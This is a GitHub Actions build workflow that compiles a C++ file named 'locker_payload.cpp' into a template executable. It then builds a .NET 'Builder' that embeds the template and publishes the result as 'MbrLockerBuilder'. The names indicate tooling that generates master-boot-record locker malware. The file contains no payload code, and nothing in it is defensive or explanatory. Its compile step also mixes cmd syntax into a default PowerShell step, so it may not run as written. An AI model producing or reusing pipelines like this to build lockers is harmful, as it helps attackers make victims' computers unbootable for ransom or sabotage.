name: Build

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v3

    - name: Install NASM
      run: choco install nasm -y

    - name: Install Visual Studio Build Tools
      run: choco install visualstudio2019buildtools -y

    - name: Compile Template
      run: |
        cd template
        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
        cl /EHsc /O2 /MT locker_payload.cpp user32.lib kernel32.lib advapi32.lib
        move locker_payload.exe ..\builder\Resources\template.exe

    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: 6.0.x

    - name: Build Builder
      run: dotnet build builder/Builder.csproj -c Release -o output

    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: MbrLockerBuilder
        path: output/
